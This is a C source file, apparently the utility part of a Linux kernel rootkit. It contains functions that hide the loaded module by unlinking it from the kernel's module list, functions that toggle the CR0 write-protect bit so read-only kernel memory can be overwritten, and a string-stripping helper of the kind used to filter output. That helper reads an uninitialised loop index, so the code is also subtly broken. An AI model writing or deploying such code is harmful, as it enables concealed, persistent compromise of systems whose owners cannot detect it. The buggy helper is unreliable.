#include <linux/module.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/fs.h>
#include "util.h"

#define true 1
#define false 0
#define bool int

static struct list_head *prev;

void showself(){
	list_add(&THIS_MODULE->list, prev);
}

void hideself(){
	prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

void setwp() {
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	asm volatile("mov %0,%%cr0" : "+r"(cr0) : __FORCE_ORDER);
}

void unsetwp(){
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	asm volatile("mov %0,%%cr0" : "+r"(cr0) : __FORCE_ORDER);
}

bool exists(char* path) {
	struct file *fp = NULL;
	fp = filp_open(path, O_RDONLY, 0);
	if (IS_ERR(fp)) return false;

	filp_close(fp, NULL);
	return true;
}

bool remove_sub(char* str, char* sub){
	int i, j = 0;
	bool ret = false;
  int str_len = strlen(str);
  int sub_len = strlen(sub);
  
	while (i < str_len){
		if(strstr(&str[i], sub) == &str[i]){
			str_len -= sub_len;
			ret = true;

			for (j = i; j < str_len; j++)
				str[j] = str[j + sub_len];
		}
		else i++;
  }
		
	str[i] = '\0';
	return ret;
}
